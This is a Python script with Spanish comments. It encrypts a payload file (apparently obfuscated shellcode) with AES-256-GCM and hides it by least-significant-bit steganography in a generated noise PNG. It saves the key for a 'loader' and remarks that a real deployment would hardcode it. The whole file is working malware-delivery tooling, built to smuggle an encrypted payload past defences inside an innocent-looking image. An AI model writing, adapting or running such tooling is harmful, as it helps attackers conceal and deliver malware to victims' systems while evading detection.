import sys
import os
import struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from PIL import Image
import numpy as np

# Configuración
PAYLOAD_FILE = "mscc_obf"
CARRIER_FILE = "carrier.png"
OUTPUT_FILE = "image.png"
KEY_FILE = "aes.key"

def generate_noise_image(size, path):
    """Genera una imagen de ruido de alta entropía."""
    print(f"[*] Generando imagen portadora de ruido ({size[0]}x{size[1]})...")
    # Usamos ruido aleatorio para simular una textura o imagen compleja
    noise = np.random.randint(0, 255, (size[1], size[0], 3), dtype=np.uint8)
    img = Image.fromarray(noise, 'RGB')
    img.save(path)

def encrypt_payload(data):
    """Cifra el payload con AES-256-GCM."""
    key = get_random_bytes(32)
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Formato: TOTAL_LEN(4) + NONCE (12) + TAG (16) + SIZE (4) + CIPHERTEXT
    payload_content = nonce + tag + struct.pack("<I", len(ciphertext)) + ciphertext
    final_payload = struct.pack("<I", len(payload_content)) + payload_content

    print(f"[*] Payload cifrado. Tamaño total: {len(final_payload)} bytes")

    # Guardar clave para el loader (en un despliegue real estaría hardcoded o derivada)
    with open(KEY_FILE, "wb") as f:
        f.write(key)

    return final_payload

def embed_lsb(image_path, data, output_path):
    """Incrusta datos en los LSB de la imagen."""
    img = Image.open(image_path)
    img = img.convert('RGB')
    pixels = np.array(img)

    flat_pixels = pixels.flatten()
    data_len = len(data)
    bits_needed = data_len * 8

    if bits_needed > len(flat_pixels):
        raise ValueError(f"Imagen demasiado pequeña. Necesita {bits_needed} pixels, tiene {len(flat_pixels)}")

    print(f"[*] Incrustando {data_len} bytes en {output_path}...")

    # Convertir datos a bits
    data_bits = np.unpackbits(np.frombuffer(data, dtype=np.uint8))

    # Modificar LSB
    flat_pixels[:len(data_bits)] = (flat_pixels[:len(data_bits)] & 0xFE) | data_bits

    # Reconstruir imagen
    new_pixels = flat_pixels.reshape(pixels.shape)
    new_img = Image.fromarray(new_pixels)
    new_img.save(output_path)
    print("[*] Esteganografía completada.")

def main():
    if not os.path.exists(PAYLOAD_FILE):
        print(f"Error: {PAYLOAD_FILE} no existe.")
        sys.exit(1)

    with open(PAYLOAD_FILE, "rb") as f:
        payload_data = f.read()

    # Calcular tamaño necesario (aprox 8 pixels por byte)
    # 50KB payload -> 400k pixels -> 800x600 es suficiente
    required_pixels = (len(payload_data) + 32 + 100) * 8
    side = int(np.ceil(np.sqrt(required_pixels))) + 100
    generate_noise_image((side, side), CARRIER_FILE)

    encrypted_blob = encrypt_payload(payload_data)
    embed_lsb(CARRIER_FILE, encrypted_blob, OUTPUT_FILE)

    # Limpieza
    if os.path.exists(CARRIER_FILE):
        os.remove(CARRIER_FILE)

if __name__ == "__main__":
    main()
